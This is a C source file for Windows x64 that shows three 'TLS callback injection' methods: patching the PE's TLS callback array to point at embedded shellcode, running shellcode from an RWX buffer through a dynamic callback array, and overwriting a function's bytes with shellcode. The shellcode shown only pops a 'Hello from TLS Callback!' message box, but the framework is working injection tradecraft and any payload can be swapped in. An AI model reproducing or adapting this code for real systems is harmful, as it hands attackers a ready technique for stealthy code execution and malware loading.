#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

// x64 MessageBox shellcode
unsigned char shellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
    "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
    "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
    "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
    "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
    "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
    "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
    "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
    "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
    "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
    "\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
    "\x85\x11\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
    "\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c"
    "\x6c\x6f\x20\x66\x72\x6f\x6d\x20\x54\x4c\x53\x20\x43\x61\x6c"
    "\x6c\x62\x61\x63\x6b\x21\x00\x48\x65\x6c\x6c\x6f\x20\x57\x6f"
    "\x72\x6c\x64\x21\x00";

// PE header structures
typedef struct _IMAGE_TLS_DIRECTORY64
{
    ULONGLONG StartAddressOfRawData;
    ULONGLONG EndAddressOfRawData;
    ULONGLONG AddressOfIndex;
    ULONGLONG AddressOfCallBacks;
    ULONG SizeOfZeroFill;
    ULONG Characteristics;
} IMAGE_TLS_DIRECTORY64, *PIMAGE_TLS_DIRECTORY64;

// TLS callback function prototype
typedef VOID(NTAPI *PTLS_CALLBACK_FUNCTION)(PVOID DllHandle, DWORD Reason, PVOID Reserved);

// Global TLS callback array (will be patched)
PTLS_CALLBACK_FUNCTION g_TlsCallbacks[] = {NULL, NULL};

// Dummy TLS callback (will be overwritten)
VOID NTAPI TlsCallback(PVOID DllHandle, DWORD Reason, PVOID Reserved)
{
    // This code NEVER executes - will be patched with shellcode
    printf("[!] Original TLS callback - THIS SHOULD NOT PRINT!\n");
}

// Patch function with shellcode
BOOL PatchFunction(PVOID funcAddress, PVOID shellcodeAddr, SIZE_T shellcodeSize)
{
    DWORD oldProtect;

    if (!VirtualProtect(funcAddress, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect))
    {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

    memcpy(funcAddress, shellcodeAddr, shellcodeSize);
    VirtualProtect(funcAddress, shellcodeSize, oldProtect, &oldProtect);

    return TRUE;
}

// Find TLS directory in current module
PIMAGE_TLS_DIRECTORY64 FindTlsDirectory()
{
    // Get base address of current module
    HMODULE hModule = GetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE *)hModule + pDosHeader->e_lfanew);

    // Check if TLS directory exists
    if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0)
    {
        printf("[-] No TLS directory found\n");
        return NULL;
    }

    // Get TLS directory address
    PIMAGE_TLS_DIRECTORY64 pTlsDir = (PIMAGE_TLS_DIRECTORY64)((BYTE *)hModule + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);

    printf("[+] TLS directory found at: %p\n", pTlsDir);
    return pTlsDir;
}

// METHOD 1: Patch existing TLS callback in PE header
BOOL PatchTlsCallbackInPE()
{
    PIMAGE_TLS_DIRECTORY64 pTlsDir = FindTlsDirectory();
    if (!pTlsDir)
        return FALSE;

    // Get address of TLS callback array
    PTLS_CALLBACK_FUNCTION *pCallbackArray = (PTLS_CALLBACK_FUNCTION *)pTlsDir->AddressOfCallBacks;

    if (!pCallbackArray || *pCallbackArray == NULL)
    {
        printf("[-] No TLS callbacks found\n");
        return FALSE;
    }

    printf("[*] TLS callback array at: %p\n", pCallbackArray);
    printf("[*] Original TLS callback at: %p\n", *pCallbackArray);

    // Make callback array writable
    DWORD oldProtect;
    VirtualProtect((LPVOID)pCallbackArray, sizeof(PVOID), PAGE_READWRITE, &oldProtect);

    // Replace callback with shellcode address
    *pCallbackArray = (PTLS_CALLBACK_FUNCTION)shellcode;

    VirtualProtect((LPVOID)pCallbackArray, sizeof(PVOID), oldProtect, &oldProtect);

    printf("[+] TLS callback patched to shellcode: %p\n", shellcode);
    printf("[!] Shellcode will execute on next DLL_THREAD_ATTACH or process attach!\n");

    return TRUE;
}

// METHOD 2: Dynamic TLS callback injection (runtime)
BOOL InjectDynamicTlsCallback()
{
    // Allocate executable memory for shellcode
    LPVOID execMemory = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!execMemory)
    {
        printf("[-] VirtualAlloc failed\n");
        return FALSE;
    }

    memcpy(execMemory, shellcode, sizeof(shellcode));
    printf("[+] Shellcode at: %p\n", execMemory);

    // Create TLS callback array in writable memory
    PTLS_CALLBACK_FUNCTION *pDynamicCallbacks = (PTLS_CALLBACK_FUNCTION *)VirtualAlloc(
        NULL,
        sizeof(PVOID) * 3,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (!pDynamicCallbacks)
    {
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    // Set up callback array: [shellcode, NULL, NULL]
    pDynamicCallbacks[0] = (PTLS_CALLBACK_FUNCTION)execMemory;
    pDynamicCallbacks[1] = NULL;

    printf("[+] Dynamic TLS callback array at: %p\n", pDynamicCallbacks);
    printf("[+] Callback pointing to: %p\n", pDynamicCallbacks[0]);

    // Manually trigger TLS callback
    printf("[*] Manually triggering TLS callback...\n");
    pDynamicCallbacks[0](NULL, DLL_PROCESS_ATTACH, NULL);

    // Cleanup
    VirtualFree(pDynamicCallbacks, 0, MEM_RELEASE);
    VirtualFree(execMemory, 0, MEM_RELEASE);

    return TRUE;
}

// METHOD 3: Patch current module's TLS callback via direct memory overwrite
BOOL PatchCurrentTlsCallback()
{
    // Patch our TlsCallback function with shellcode
    printf("[*] Patching TlsCallback function at: %p\n", TlsCallback);

    if (!PatchFunction((PVOID)TlsCallback, shellcode, sizeof(shellcode)))
    {
        printf("[-] Failed to patch TlsCallback\n");
        return FALSE;
    }

    printf("[+] TlsCallback patched with shellcode\n");

    // Manually trigger (in real scenario, this happens at thread attach/detach)
    printf("[*] Manually triggering patched TLS callback...\n");
    TlsCallback(NULL, DLL_PROCESS_ATTACH, NULL);

    return TRUE;
}

int main()
{
    printf("[ TLS Callback Injection (x64) ]\n");
    printf("[*] Process ID: %d\n", GetCurrentProcessId());
    printf("[*] Shellcode size: %zu bytes\n", sizeof(shellcode));

    // Make shellcode executable
    DWORD oldProtect;
    VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);

    printf("\n=== METHOD 1: Patch PE Header TLS Callback ===\n");
    PatchTlsCallbackInPE();
    system("pause");

    printf("\n=== METHOD 2: Dynamic TLS Callback ===\n");
    InjectDynamicTlsCallback();
    system("pause");

    printf("\n=== METHOD 3: Patch Current TLS Callback ===\n");
    PatchCurrentTlsCallback();
    system("pause");

    return 0;
}

// x86_64-w64-mingw32-gcc -o tls_callback_injection.exe tls_callback_injection.c
